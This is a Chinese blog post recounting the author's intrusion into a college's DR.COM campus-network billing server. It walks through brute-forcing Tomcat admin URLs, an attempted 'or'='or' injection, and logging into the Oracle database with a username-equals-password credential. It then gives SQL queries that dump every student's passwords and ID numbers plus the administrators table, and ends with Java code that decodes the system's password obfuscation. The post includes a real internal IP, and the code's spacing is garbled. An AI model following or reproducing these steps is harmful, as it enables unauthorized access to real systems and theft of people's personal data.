---
title: 基于DR.COM端口弱口令的研究
categories:
  - Operations
date: 2015-04-17 03:52:55
---

<span style="margin: 0px; padding: 0px; font-family: 宋体;">由于校园网采用</span><span style="margin: 0px; padding: 0px;">DR.COM</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">城市热点服务端，加上校园网速未能像往常一样快速畅通。以至于萌发突破校园网终端的想法。研究方法通过服务器后台突破，端口突破，数据库突破，以及管理员加密算法方式的研究。</span>

<span style="margin: 0px; padding: 0px; font-family: 宋体;">突破服务器后台，首先需要知道学院充值的网址</span><span style="margin: 0px; padding: 0px;">URL</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">，</span><span style="margin: 0px; padding: 0px;">[http://172.23.0.18/Self/nav_login](http://172.23.0.18/Self/nav_login)</span>

<span style="margin: 0px; padding: 0px; font-family: 宋体;">这样我们就知道了他服务器的主页首地址，也就是</span><span style="margin: 0px; padding: 0px;">172.23.0.18</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">。一看是用了</span>**<span style="margin: 0px; padding: 0px; font-family: Arial, sans-serif;">Apache Tomcat</span>**<span style="margin: 0px; padding: 0px; font-family: 宋体;">的服务器后台。那就通过暴力搜索后台网址就好了。会发现有用的</span><span style="margin: 0px; padding: 0px;">URL</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">没有多少，闲话不多说了。想必管理人员会对下图比较熟悉吧。</span>

<span style="margin: 0px; padding: 0px; font-family: 宋体;">![](images/study/dr1.jpg)</span>

<span style="margin: 0px; padding: 0px; font-family: 宋体;">但是看到帐号和密码就比较费脑筋了，随便试了几个，都不行，看来这个不是容易随便就能登录的，看了下这个主页的代码。发现用的是</span><span style="margin: 0px; padding: 0px;">javascript</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">的脚本辅助登录。</span>

<span style="margin: 0px; padding: 0px;">if(parseInt(trytimes)>=3){$("#tr_random").show();}</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">也就是说如果尝试登录</span><span style="margin: 0px; padding: 0px;">3</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">次以上就会出现验证码，以防</span><span style="margin: 0px; padding: 0px;">Demo</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">等软件尝试进入。这里</span><span style="margin: 0px; padding: 0px;">’or’=’or’</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">也无法尝试登录，看来城市热点还是比较</span><span style="margin: 0px; padding: 0px;">firewall</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">的。</span>

<span style="margin: 0px; padding: 0px;">       </span><span style="margin: 0px; padding: 0px; font-family: 宋体;">剩下的难点就是突破登录平台方面了，查找后台</span><span style="margin: 0px; padding: 0px;">URL</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">。发现有一个是数据库的页面，仔细观察一看这个</span><span style="margin: 0px; padding: 0px;">Oracle 10g</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">的版本。也能看出数据库的端口号是</span><span style="margin: 0px; padding: 0px;">1521</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">。账户名</span><span style="margin: 0px; padding: 0px;">USER</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">为</span><span style="margin: 0px; padding: 0px;">drcom</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">，密钥是</span><span style="margin: 0px; padding: 0px;">******</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">，但是也重在尝试吧，</span><span style="margin: 0px; padding: 0px;">USER= PASSWD</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">。成功。</span>

<span style="margin: 0px; padding: 0px;">Dll</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">：</span><span style="margin: 0px; padding: 0px;">ocijdbc9</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">。</span>

<span style="margin: 0px; padding: 0px; font-family: 宋体;">然后就可以开始尝试在本地连接远程数据库了，知道了用户名，密码，和端口号，剩下的就很简单也很容易了。</span>

<span style="margin: 0px; padding: 0px; font-family: 宋体;">![](images/study/dr2.jpg)</span>

<span style="margin: 0px; padding: 0px; font-family: 宋体;">查看下当前用户下的所有表：</span>

<span style="margin: 0px; padding: 0px;">SELECT * FROM USER_TABLES;</span>

<span style="margin: 0px; padding: 0px; font-family: 宋体;">会展示所有的用户表，其次在查询表中数据。</span>

<span style="margin: 0px; padding: 0px;">SELECT a.* FROM TBLREGISTERUSERA a UNION ALL SELECT b.* FROM TBLREGISTERUSERSHISTORY b;</span>

<span style="margin: 0px; padding: 0px; font-family: 宋体;">会查询到所有的学院学生的登录信息和密码，甚至还有身份证号，这弱口令造成的问题会是相当的可怕想必大家都会知道的。</span>

<span style="margin: 0px; padding: 0px; font-family: 宋体;">在搜索下关于</span><span style="margin: 0px; padding: 0px;">ADMIN</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">方面的表。查询到</span><span style="margin: 0px; padding: 0px;">USER_DATA</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">中有一个表很有用，查询一下它会发现令人激动的信息！这简直太爽了，就像是一个陌生人不用钥匙就打开了你们家的锁，所有他想得到的东西他都会得到。  
<span style="margin: 0px; padding: 0px;"> </span></span><span style="margin: 0px; padding: 0px; text-indent: 21.75pt;">SELECT * FROM TBLADMINISTRATORS;</span><span style="margin: 0px; padding: 0px; text-indent: 21.75pt; font-family: 宋体;"> </span>

<span style="margin: 0px; padding: 0px; text-indent: 21.75pt; font-family: 宋体;">![](images/study/dr3.jpg)</span>

<span style="margin: 0px; padding: 0px; font-family: 宋体;">剩下的就是加密算法的研究了。这部分最令人头疼。但是学校初始密码为</span><span style="margin: 0px; padding: 0px;">123</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">，相对应用户表中最多的数据来看，</span><span style="margin: 0px; padding: 0px;">123</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">密码对应的加密方式为</span><span style="margin: 0px; padding: 0px;">Mk*a</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">，在仔细观察每一加密后的加密结尾都为</span><span style="margin: 0px; padding: 0px;">a</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">，也就是说</span><span style="margin: 0px; padding: 0px;">a</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">为输入两次密码后已经确认后的加密方式，如果是</span><span style="margin: 0px; padding: 0px;">b</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">结尾也就代表已被注销的用户。下面是自己写的一个</span><span style="margin: 0px; padding: 0px;">3</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">位数加密解密的代码（纯属无聊）。</span>

<span style="margin: 0px; padding: 0px;">import java.util.Scanner;</span>

<span style="margin: 0px; padding: 0px;"> </span>

<span style="margin: 0px; padding: 0px;">public class Passwd {</span>

<span style="margin: 0px; padding: 0px;">       staticString passwd_ascii;</span>

<span style="margin: 0px; padding: 0px;"> </span>

<span style="margin: 0px; padding: 0px;">       staticString pwd;</span>

<span style="margin: 0px; padding: 0px;"> </span>

<span style="margin: 0px; padding: 0px;">       publicstatic void main(String[] args) {</span>

<span style="margin: 0px; padding: 0px;">              System.out.println("PleaseInput The Passwd :");</span>

<span style="margin: 0px; padding: 0px;">              Scannersc = new Scanner(System.in);</span>

<span style="margin: 0px; padding: 0px;">              Stringpasswd = sc.nextLine();</span>

<span style="margin: 0px; padding: 0px;">              System.out.println("ToChange Ascii Of The Passwd To The PasswdAscii :");</span>

<span style="margin: 0px; padding: 0px;">              PasswdAscii(passwd);   </span>

<span style="margin: 0px; padding: 0px;">       }</span>

<span style="margin: 0px; padding: 0px;"> </span>

<span style="margin: 0px; padding: 0px;">       privatestatic String PasswdAscii(String passwdtext) {</span>

<span style="margin: 0px; padding: 0px;">              //TODO Auto-generated method stub</span>

<span style="margin: 0px; padding: 0px;">              charascii[] = new char[20];</span>

<span style="margin: 0px; padding: 0px;">              charlastChar = passwdtext.charAt(passwdtext.length() - 1);</span>

<span style="margin: 0px; padding: 0px;">              if(lastChar != 'a') {</span>

<span style="margin: 0px; padding: 0px;">                     for(int i = 0; i < passwdtext.length(); i++) {</span>

<span style="margin: 0px; padding: 0px;">                            ascii[i]= passwdtext.charAt(i);// </span><span style="margin: 0px; padding: 0px; font-family: 宋体;">转换成</span><span style="margin: 0px; padding: 0px;">ASCII</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">码</span>

<span style="margin: 0px; padding: 0px;">                            //(int)</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">转换成</span><span style="margin: 0px; padding: 0px;">ASCII</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">码，但存放到</span><span style="margin: 0px; padding: 0px;">String</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">中</span>

<span style="margin: 0px; padding: 0px;">                            if(i == 0) {</span>

<span style="margin: 0px; padding: 0px;">                                   passwd_ascii= String.valueOf((int) ascii[i] - 28);// (int)</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">转换成</span><span style="margin: 0px; padding: 0px;">ASCII</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">码，第</span><span style="margin: 0px; padding: 0px;">0</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">位</span>

<span style="margin: 0px; padding: 0px;">                            }else if (i == 1) {</span>

<span style="margin: 0px; padding: 0px;">                                   passwd_ascii= String.valueOf((int) ascii[i] - 28 - 29);// (int)</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">转换成</span><span style="margin: 0px; padding: 0px;">ASCII</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">码，第</span><span style="margin: 0px; padding: 0px;">1</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">位</span>

<span style="margin: 0px; padding: 0px;">                            }else if (i == 2) {</span>

<span style="margin: 0px; padding: 0px;">                                   passwd_ascii= String.valueOf((int) ascii[i] - 28 - 29 - 30</span>

<span style="margin: 0px; padding: 0px;">                                                 +126 - 30);// (int)</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">转换成</span><span style="margin: 0px; padding: 0px;">ASCII</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">码，第</span><span style="margin: 0px; padding: 0px;">2</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">位</span>

<span style="margin: 0px; padding: 0px;">                            }else if (i == 3) {</span>

<span style="margin: 0px; padding: 0px;">                                   passwd_ascii= String.valueOf((int) ascii[i] - 28 - 29 - 30</span>

<span style="margin: 0px; padding: 0px;">                                                 +126 - 30 - 28);// (int)</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">转换成</span><span style="margin: 0px; padding: 0px;">ASCII</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">码，第</span><span style="margin: 0px; padding: 0px;">2</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">位</span>

<span style="margin: 0px; padding: 0px;">                            }</span>

<span style="margin: 0px; padding: 0px;">                            System.out.print(passwd_ascii+ "\t");</span>

<span style="margin: 0px; padding: 0px;">                            System.out.print("ThePassword is :");</span>

<span style="margin: 0px; padding: 0px;">                            PasswordString(passwd_ascii);</span>

<span style="margin: 0px; padding: 0px;">                            System.out.println();</span>

<span style="margin: 0px; padding: 0px;">                     }</span>

<span style="margin: 0px; padding: 0px;">                     System.out.println();</span>

<span style="margin: 0px; padding: 0px;">                    </span>

<span style="margin: 0px; padding: 0px;">                    </span>

<span style="margin: 0px; padding: 0px;">              }else {</span>

<span style="margin: 0px; padding: 0px;">                     for(int i = 0; i < passwdtext.length() - 1; i++) {</span>

<span style="margin: 0px; padding: 0px;">                            ascii[i]= passwdtext.charAt(i);// </span><span style="margin: 0px; padding: 0px; font-family: 宋体;">转换成</span><span style="margin: 0px; padding: 0px;">ASCII</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">码</span>

<span style="margin: 0px; padding: 0px;">                            //(int)</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">转换成</span><span style="margin: 0px; padding: 0px;">ASCII</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">码，但存放到</span><span style="margin: 0px; padding: 0px;">String</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">中</span>

<span style="margin: 0px; padding: 0px;">                            if(i == 0) {</span>

<span style="margin: 0px; padding: 0px;">                                   passwd_ascii= String.valueOf((int) ascii[i] - 28);// (int)</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">转换成</span><span style="margin: 0px; padding: 0px;">ASCII</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">码，第</span><span style="margin: 0px; padding: 0px;">0</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">位</span>

<span style="margin: 0px; padding: 0px;">                            }else if (i == 1) {</span>

<span style="margin: 0px; padding: 0px;">                                   passwd_ascii= String.valueOf((int) ascii[i] - 28 - 29);// (int)</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">转换成</span><span style="margin: 0px; padding: 0px;">ASCII</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">码，第</span><span style="margin: 0px; padding: 0px;">1</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">位</span>

<span style="margin: 0px; padding: 0px;">                            }else if (i == 2) {</span>

<span style="margin: 0px; padding: 0px;">                                   passwd_ascii= String.valueOf((int) ascii[i] - 28 - 29 - 30</span>

<span style="margin: 0px; padding: 0px;">                                                 +126 - 30);// (int)</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">转换成</span><span style="margin: 0px; padding: 0px;">ASCII</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">码，第</span><span style="margin: 0px; padding: 0px;">2</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">位</span>

<span style="margin: 0px; padding: 0px;">                            }else if (i == 3) {</span>

<span style="margin: 0px; padding: 0px;">                                   passwd_ascii= String.valueOf((int) ascii[i] - 28 - 29 - 30</span>

<span style="margin: 0px; padding: 0px;">                                                 +126 - 30 - 28);// (int)</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">转换成</span><span style="margin: 0px; padding: 0px;">ASCII</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">码，第</span><span style="margin: 0px; padding: 0px;">2</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">位</span>

<span style="margin: 0px; padding: 0px;">                            }</span>

<span style="margin: 0px; padding: 0px;">                            System.out.print(passwd_ascii+ "\t");</span>

<span style="margin: 0px; padding: 0px;">                            System.out.print("ThePassword is :");</span>

<span style="margin: 0px; padding: 0px;">                            PasswordString(passwd_ascii);</span>

<span style="margin: 0px; padding: 0px;">                            System.out.println();</span>

<span style="margin: 0px; padding: 0px;">                     }</span>

<span style="margin: 0px; padding: 0px;">                     System.out.println("NULL!");</span>

<span style="margin: 0px; padding: 0px;">              }</span>

<span style="margin: 0px; padding: 0px;">              returnpasswd_ascii;</span>

<span style="margin: 0px; padding: 0px;">       }</span>

<span style="margin: 0px; padding: 0px;"> </span>

<span style="margin: 0px; padding: 0px;">       privatestatic String PasswordString(String passwd_ascii) {</span>

<span style="margin: 0px; padding: 0px;">              pwd= passwd_ascii;</span>

<span style="margin: 0px; padding: 0px;">              for(int i = 0; i < 1; i++) {</span>

<span style="margin: 0px; padding: 0px;">                     //String -> int -> char -> LASTPWD</span>

<span style="margin: 0px; padding: 0px;">                     intIntPwd = Integer.parseInt(pwd);</span>

<span style="margin: 0px; padding: 0px;">                     charLASTPWD = (char) (IntPwd);</span>

<span style="margin: 0px; padding: 0px;">                     System.out.print(LASTPWD+"\t");</span>

<span style="margin: 0px; padding: 0px;">              }</span>

<span style="margin: 0px; padding: 0px;">              returnpwd;</span>

<span style="margin: 0px; padding: 0px;">       }</span>

<span style="margin: 0px; padding: 0px;">}</span>

<span style="margin: 0px; padding: 0px;">// </span><span style="margin: 0px; padding: 0px; font-family: 宋体;">每个字符加密后</span><span style="margin: 0px; padding: 0px;">ASCII</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">都是在</span><span style="margin: 0px; padding: 0px;">32-126</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">之间，从第一位开始加</span><span style="margin: 0px; padding: 0px;">28</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">，第二位加</span><span style="margin: 0px; padding: 0px;">28+29</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">，第三位加</span><span style="margin: 0px; padding: 0px;">28+29+30</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">，如果超过</span><span style="margin: 0px; padding: 0px;">126</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">的部分，则返回</span><span style="margin: 0px; padding: 0px;">32</span><span style="margin: 0px; padding: 0px; font-family: 宋体;">开始。</span>

<span style="margin: 0px; padding: 0px;"> </span>

<span style="margin: 0px; padding: 0px; font-family: 宋体;">最后，通过这一次的尝试，我想说弱口令真的很可怕，希望我的朋友们在设置您的密码的时候最好都不要使用到弱口令，您的信息安全特别重要，请误告诉他人。</span>

<span style="margin: 0px; padding: 0px; font-family: 宋体;">纯属测试，请勿用于非法、商务途径，后果自负。</span>
